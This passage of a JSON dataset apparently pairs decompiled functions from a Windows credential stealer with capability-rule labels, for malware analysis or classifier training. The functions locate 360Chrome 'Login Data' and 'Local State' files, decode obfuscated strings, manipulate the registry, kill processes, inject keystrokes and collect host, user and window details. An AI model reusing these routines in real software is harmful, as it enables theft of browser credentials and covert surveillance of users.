            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f717(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\360Chrome\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(0xb, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 156
    },
    "0040f772": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f772(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack1044, 0x204, 0x423cdf, uVar2);\n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\360Chrome\\\\Chrome\\\\User Data\\\\Local State\", uVar2);\n    cVar1 = fcn.00406f1a(auStack1044);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00406f1a(auStack528),  cVar1 != '\\0')) {\n        uVar2 = fcn.0040edd6(0xb, auStack1044, auStack528);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 237
    },
    "0040f80e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f80e(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"APPDATA\");\n    uVar3 = fcn.004081aa(\"%6\\\\Tsd0C MW85gC0d\\\\Tsd0C M5CVid\\\\mWn4R aC5C\");\n    fcn.004127a8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(7, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 193
    },
    "00410193": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00410193(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    \n    uVar3 = 0;\n    uVar1 = fcn.00412666(param_1);\n    iVar2 = sub.KERNEL32.dll_OpenProcess(1, 0, uVar1);\n    if (iVar2 != 0) {\n        uVar4 = sub.KERNEL32.dll_TerminateProcess(iVar2, 0);\n        uVar3 = uVar4 & 0xffffff00 | uVar4 != 0;\n        sub.KERNEL32.dll_CloseHandle(iVar2, uVar4 >> 0x20);\n    }\n    return uVar3;\n}\n",
        "token_count": 170
    },
    "004102bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004102bc(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00410284();\n    return param_1 + uVar1 % ((param_2 - param_1) + 1U);\n}\n",
        "token_count": 71
    },
    "0041049b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041049b(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.004103f6(param_1, param_2, param_3, param_2, param_3);\n    return;\n}\n",
        "token_count": 57
    },
    "00410520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00410520(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uStack96;\n    uchar *puStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uchar auStack40 [12];\n    uchar auStack28 [4];\n    uint uStack24;\n    \n    puStack44 = &stack0xffffffe4;\n    uStack48 = 0x20019;\n    uStack52 = 0;\n    uStack24 = 0;\n    uStack56 = param_2;\n    puStack60 = param_1;\n    uStack64 = 0x41055d;\n    iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack64 = 0;\n        iStack68 = 0;\n        uStack72 = 0;\n        uStack76 = param_3;\n        uStack80 = uStack48;\n        puStack84 = 0x41059b;\n        puStack60 = &stack0xffffffd8;\n        iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n        if (iVar1 == 0) {\n            iStack68 = sub.msvcrt.dll_malloc(uStack64);\n            if (iStack68 != 0) {\n                puStack92 = &stack0xffffffc4;\n                uStack96 = 0;\n                iStack88 = iStack68;\n                puStack84 = &stack0xffffffd8;\n                iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(uStack72, param_3);\n                if (iVar1 != 0) {\n                    fcn.00407f59(&stack0xffffffa4);\n                }\n            }\n            sub.ADVAPI32.DLL_RegCloseKey(uStack96);\n            return uStack96;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 486
    },
    "00410608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00410608(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint uVar6;\n    uint uStack24;\n    uint uStack20;\n    char *apcStack16 [2];\n    \n    bVar5 = false;\n    uVar6 = 0;\n    uVar2 = sub.ADVAPI32.DLL_RegCreateKeyExA(param_1, param_2, 0, 0, 0, 0xf003f, 0, apcStack16, 0);\n    if (uVar2 == 0) {\n        uVar2 = 0xffffffff;\n        pcVar4 = apcStack16[0];\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = sub.ADVAPI32.DLL_RegSetValueExA(uVar6, uStack24, 0, uStack20, apcStack16[0], ~uVar2 - 1);\n        bVar5 = iVar3 == 0;\n        uVar2 = sub.ADVAPI32.DLL_RegCloseKey(param_1);\n    }\n    return uVar2 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 335
    },
    "004106bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004106bd(uchar *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uint in_stack_ffffff98;\n    uchar *puStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uchar auStack56 [8];\n    uint uStack48;\n    int32_t iStack44;\n    uchar auStack40 [16];\n    uchar *puStack24;\n    \n    uStack64 = 0x201;\n    uStack68 = 0;\n    uStack72 = param_2;\n    puStack76 = param_1;\n    puStack80 = 0x4106f4;\n    puStack60 = &stack0xffffffd8;\n    iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        puVar2 = &stack0xffffffc8;\n        puStack80 = NULL;\n        uStack84 = 0;\n        uStack88 = 0;\n        uVar3 = 0;\n        uStack92 = param_3;\n        puStack96 = puStack60;\n        puStack76 = puVar2;\n        iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n        if ((iVar1 != 0) || (puStack24 <= puStack80)) goto code_r0x004107ec;\n    }\n    else {\n        puStack96 = param_1;\n        uVar3 = 0;\n        uStack84 = 0x101;\n        uStack88 = 0;\n        uStack92 = param_2;\n        puStack80 = &stack0xffffffd8;\n        iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            return 0;\n        }\n        puVar2 = &stack0xffffffb4;\n        in_stack_ffffff98 = 0;\n        puStack96 = puVar2;\n        iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(puStack80, param_3, 0, 0);\n        if ((iVar1 != 0) || (iStack44 == 0)) goto code_r0x004107ec;\n    }\n    uVar3 = sub.ADVAPI32.DLL_RegQueryValueExA(in_stack_ffffff98, param_3, 0, &stack0xffffffa0, uStack48, puVar2);\n    uVar3 = uVar3 & 0xffffff00 | uVar3 == 0;\ncode_r0x004107ec:\n    sub.ADVAPI32.DLL_RegCloseKey(in_stack_ffffff98);\n    return uVar3;\n}\n",
        "token_count": 647
    },
    "00410803": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00410803(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    ulong uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uchar auStack16 [8];\n    uint uStack8;\n    \n    bVar2 = false;\n    puVar4 = auStack16;\n    uVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA(param_1, param_2, 0, 0x102, puVar4);\n    if (uVar1 == 0) {\n        uVar3 = sub.ADVAPI32.DLL_RegDeleteValueA(uStack36, uStack8);\n        bVar2 = uVar3 == 0;\n        uVar1 = sub.ADVAPI32.DLL_RegCloseKey(puVar4, uVar3 >> 0x20);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 216
    },
    "004109d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004109d8(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint uStack184;\n    uint uStack180;\n    uchar auStack176 [12];\n    uchar auStack164 [148];\n    \n    uVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA(param_1, param_2, 0, 0x108, auStack164);\n    uVar3 = 0;\n    if (uVar1 == 0) {\n        uStack180 = 0x40;\n        iVar4 = 0;\n        while (iVar2 = sub.ADVAPI32.DLL_RegEnumKeyExA(uStack184, iVar4, auStack176, &uStack180, 0, 0, 0, 0), \n              iVar2 != 0x103) {\n            iVar4 = iVar4 + 1;\n            iVar2 = fcn.004127a8();\n            if (iVar2 != 0) {\n                fcn.00412458();\n            }\n        }\n        uVar1 = sub.ADVAPI32.DLL_RegCloseKey();\n        uVar3 = 1;\n    }\n    return uVar1 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 297
    },
    "00411738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00411738(uint param_1, uint param_2)\n\n{\n    uchar auStack16 [16];\n    \n    sub.KERNEL32.dll_WriteFile(*0x42b5d4, param_1, param_2, auStack16, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00411a22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nuint32_t fcn.00411a22(uint param_1, uchar param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack16 [16];\n    \n    auStack16[0] = param_2;\n    iVar1 = sub.WS2_32.dll_send(param_1, auStack16, 1, 0);\n    return iVar1 - 1U & 0xffffff00 | iVar1 - 1U == 0;\n}\n",
        "token_count": 101
    },
    "00412191": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412191(uchar param_1)\n\n{\n    sub.USER32.dll_keybd_event(param_1, 0, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "004121c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004121c0(uchar param_1)\n\n{\n    sub.USER32.dll_keybd_event(param_1, 0, 2, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0041236c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0041236c(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_malloc(param_2);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        fcn.004129e4(iVar1, 0, param_2);\n        param_1[1] = param_2;\n        param_1[2] = 0;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 119
    },
    "004123b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004123b1(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        sub.msvcrt.dll_free(*param_1);\n        *param_1 = 0;\n    }\n    param_1[1] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 78
    },
    "00412415": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00412415(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_realloc(*param_1, param_2 + 1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        param_1[2] = 0;\n        param_1[1] = 0;\n    }\n    else {\n        *(iVar1 + param_2) = 0;\n        param_1[1] = param_2;\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 143
    },
    "00412458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00412458(int32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    bool bVar1;\n    char cVar2;\n    \n    bVar1 = param_3 == 0 || param_2 == 0;\n    if (param_3 != 0 && param_2 != 0) {\n        if ((param_1[1] - param_1[2] < param_3) && (cVar2 = fcn.00412415(param_1, param_1[1] + param_3),  cVar2 == '\\0')\n           ) {\n            return false;\n        }\n        fcn.00412aa3(param_1[2] + *param_1, param_2, param_3);\n        param_1[2] = param_1[2] + param_3;\n        bVar1 = true;\n    }\n    return bVar1;\n}\n",
        "token_count": 209
    },
    "004124b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004124b9(uint param_1, uint *param_2)\n\n{\n    fcn.00412458(param_1, *param_2, param_2[2]);\n    return;\n}\n",
        "token_count": 47
    },
    "004125de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004125de(int32_t param_1, char *param_2, int32_t param_3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    if (param_3 != 0) {\n        pcVar2 = param_1 + param_3;\n        while( true ) {\n            if (*pcVar2 == '\\0') break;\n            iVar3 = 1;\n            if (*pcVar2 == *param_2) {\n                while( true ) {\n                    if (param_2[iVar3] == '\\0') {\n                        return pcVar2 - param_3;\n                    }\n                    cVar1 = pcVar2[iVar3];\n                    if ((param_2[iVar3] != cVar1) || (cVar1 == '\\0')) break;\n                    iVar3 = iVar3 + 1;\n                }\n                if (cVar1 == '\\0') {\n                    return -1;\n                }\n            }\n            pcVar2 = pcVar2 + 1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 236
    },
    "00412755": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00412755(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = sub.msvcrt.dll__vscprintf(param_2, &stack0x0000000c);\n    if (0 < iVar1) {\n        iVar2 = sub.msvcrt.dll_malloc(iVar1 + 1);\n        *param_1 = iVar2;\n        if (iVar2 != 0) {\n            uVar3 = sub.msvcrt.dll__vsnprintf(iVar2, iVar1 + 1, param_2, &stack0x0000000c);\n            return uVar3;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 168
    },
    "004127a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004127a8(int32_t param_1, uint32_t param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = sub.msvcrt.dll__vsnprintf(param_1, param_2, param_3, &stack0x00000010);\n    uVar2 = 0xffffffff;\n    if (0 < uVar1) {\n        if (uVar1 < param_2) {\n            *(param_1 + uVar1) = 0;\n        }\n        uVar2 = uVar1;\n        if (param_2 == uVar1) {\n            *(param_1 + -1 + uVar1) = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 178
    },
    "0041297a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041297a(char param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (param_2 != NULL) {\n        for (; *param_2 != '\\0'; param_2 = param_2 + 1) {\n            iVar1 = iVar1 + (*param_2 == param_1);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 97
    },
    "00412c0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412c0f(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    fcn.004129e4(param_2, 0, param_3);\n    uVar2 = 0xffffffff;\n    uVar3 = 0;\n    if (param_1 != 0) {\n        for (; (cVar1 = *(param_1 + uVar3),  cVar1 != '\\0' && (uVar3 < param_3)); uVar3 = uVar3 + 1) {\n            if ((cVar1 == '\\\\') || (cVar1 == '/')) {\n                uVar2 = uVar3;\n            }\n            *(param_2 + uVar3) = cVar1;\n        }\n        *(param_2 + 1 + uVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00412c67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.00412c67(int32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    \n    fcn.004129e4(param_2, 0, param_3);\n    if (param_1 == 0) {\n        return 0xffffffff;\n    }\n    uVar6 = 0xffffffff;\n    for (uVar5 = 0; (cVar2 = *(param_1 + uVar5),  cVar2 != '\\0' && (uVar5 < param_3)); uVar5 = uVar5 + 1) {\n        if ((cVar2 == '\\\\') || (cVar2 == '/')) {\n            uVar6 = uVar5;\n        }\n    }\n    pcVar1 = param_1 + 1 + uVar6;\n    pcVar3 = pcVar1;\n    if (param_3 == 0) {\ncode_r0x00412574:\n        do {\n            pcVar4 = pcVar3 + 1;\n            cVar2 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar2 != '\\0');\n    }\n    else {\n        pcVar7 = param_2;\n        do {\n            if (pcVar7 == param_2 + (param_3 - 1)) {\n                *pcVar7 = '\\0';\n                goto code_r0x00412574;\n            }\n            pcVar4 = pcVar3 + 1;\n            cVar2 = *pcVar3;\n            *pcVar7 = cVar2;\n            pcVar3 = pcVar4;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n    }\n    return pcVar4 + (-1 - pcVar1);\n}\n",
        "token_count": 441
    },
    "00412cd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.00412cd5(char *param_1, char *param_2, int32_t param_3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    fcn.004129e4(param_2, 0, param_3);\n    if (param_1 != NULL) {\n        uVar4 = 0xffffffff;\n        pcVar2 = param_1;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar2;\n            pcVar2 = pcVar2 + 1;\n        } while (cVar1 != '\\0');\n        iVar7 = 0;\n        for (iVar6 = 0; iVar6 != ~uVar4 - 1; iVar6 = iVar6 + 1) {\n            if ((param_1[iVar6] == '\\\\') || (param_1[iVar6] == '/')) {\n                iVar7 = iVar6;\n            }\n        }\n        param_1 = param_1 + iVar7 + 1;\n        uVar4 = 0xffffffff;\n        iVar7 = 0;\n        pcVar2 = param_1;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar2;\n            pcVar2 = pcVar2 + 1;\n        } while (cVar1 != '\\0');\n        for (iVar6 = 0; iVar6 != ~uVar4 - 1; iVar6 = iVar6 + 1) {\n            if (param_1[iVar6] == '.') {\n                iVar7 = iVar6;\n            }\n        }\n        if (iVar7 != 0) {\n            param_1 = param_1 + iVar7 + 1;\n            pcVar2 = param_1;\n            if (param_3 == 0) {\ncode_r0x00412574:\n                do {\n                    pcVar3 = pcVar2 + 1;\n                    cVar1 = *pcVar2;\n                    pcVar2 = pcVar3;\n                } while (cVar1 != '\\0');\n            }\n            else {\n                pcVar5 = param_2;\n                do {\n                    if (pcVar5 == param_2 + param_3 + -1) {\n                        *pcVar5 = '\\0';\n                        goto code_r0x00412574;\n                    }\n                    pcVar3 = pcVar2 + 1;\n                    cVar1 = *pcVar2;\n                    *pcVar5 = cVar1;\n                    pcVar2 = pcVar3;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n            }\n            return pcVar3 + (-1 - param_1);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 657
    },
    "00413040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413040(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uStack144;\n    uchar auStack140 [128];\n    \n    fcn.004129e4(param_1, 0, param_2);\n    uStack144 = param_2;\n    iVar1 = sub.KERNEL32.dll_GetComputerNameW(auStack140, &uStack144);\n    if (iVar1 == 0) {\n        fcn.00412548(param_1, \"localhost\", param_2);\n    }\n    else {\n        sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0, auStack140, 0xffffffff, param_1, 0x40, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "004130e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004130e8(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uStack144;\n    uchar auStack140 [128];\n    \n    uStack144 = param_2;\n    iVar1 = sub.ADVAPI32.DLL_GetUserNameW(auStack140, &uStack144);\n    if (iVar1 == 0) {\n        fcn.00412548(param_1, \"Unknown\", param_2);\n    }\n    else {\n        sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0, auStack140, 0xffffffff, param_1, 0x40, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0041317c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041317c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uStack1048;\n    uchar auStack1044 [1032];\n    \n    iVar1 = sub.USER32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        uStack1048 = param_2;\n        iVar1 = sub.USER32.dll_GetWindowTextW(iVar1, auStack1044, &uStack1048);\n        if (0 < iVar1) {\n            sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0, auStack1044, 0xffffffff, param_1, 0x204, 0, 0);\n            return;\n        }\n    }\n    fcn.00412548(param_1, 0x42449e, param_2);\n    return;\n}\n",
        "token_count": 190
    },
    "0041321e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041321e(uint param_1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint unaff_retaddr;\n    int32_t iStack148;\n    uchar auStack144 [140];\n    \n    iStack148 = 8;\n    uVar2 = sub.USER32.dll_GetLastInputInfo(&iStack148);\n    if (uVar2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = sub.KERNEL32.dll_GetTickCount(uVar2 >> 0x20);\n        iVar1 = iVar1 - iStack148;\n    }\n    sub.msvcrt.dll_sprintf(auStack144, 0x4244a0, iVar1);\n    fcn.00412548(unaff_retaddr, auStack144, param_1);\n    return;\n}\n",
        "token_count": 182
    },
    "0041328f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0041328f(void)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iStack28;\n    uint auStack16 [2];\n    uint *puStack8;\n    uint *puStack4;\n    \n    auStack16[0] = 0;\n    uVar1 = sub.NETAPI32.DLL_NetWkstaGetInfo(0, 0x66, auStack16);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        *puStack4 = *(iStack28 + 0x10);\n        *puStack8 = *(iStack28 + 0xc);\n        uVar1 = sub.NETAPI32.DLL_NetApiBufferFree(iStack28);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 189
    },
    "004134d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004134d1(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004132e6();\n    fcn.004127a8(param_1, param_2, 0x4244a0, uVar1);\n    return;\n}\n",
        "token_count": 72
    },
    "004134fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004134fd(uint *param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    \n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    uVar1 = sub.KERNEL32.dll_GetTickCount();\n    param_1[1] = 0;\n    *param_1 = uVar1;\n    uVar1 = fcn.004081aa(\"EiWVCiFdlW0ZM5C5Q6jf\");\n    uVar2 = fcn.00407f7a(\"kernel32.dll\");\n    pcVar3 = fcn.00407f8e(uVar2, uVar1);\n    if (pcVar3 != NULL) {\n        uStack76 = 0x40;\n        iVar4 = (*pcVar3)(&uStack76);\n        if (iVar4 != 0) {\n            param_1[2] = uStack72;\n            param_1[3] = uStack68;\n            param_1[4] = uStack64;\n            param_1[5] = uStack60;\n        }\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "0041359f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041359f(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.004129e4(param_1, 0, param_2);\n    uVar1 = fcn.004081aa(\"-DraUDrj\\\\ajMPrX9qXTL\\\\MZ65dl\\\\PdR50Ci90WYd66W0\\\\y\");\n    fcn.004106bd(0x80000002, uVar1, \"ProcessorNameString\", param_1, param_2);\n    return;\n}\n",
        "token_count": 127
    },
    "004139f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004139f8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    do {\n        *(iVar1 + 0x42b5e0) = 0;\n        iVar1 = iVar1 + 4;\n    } while (iVar1 != 0x3fc);\n    return;\n}\n",
        "token_count": 75
    },
    "00413a29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413a29(uint8_t param_1)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    \n    uVar3 = param_1;\n    cVar2 = fcn.00413a0f(uVar3);\n    if (cVar2 != '\\0') {\n        iVar1 = *(uVar3 * 4 + 0x42b5e0);\n        if (iVar1 != -0xf0f0f10) {\n            sub.msvcrt.dll_fclose(iVar1);\n        }\n        *(uVar3 * 4 + 0x42b5e0) = 0;\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004143f2": {
        "rules": [
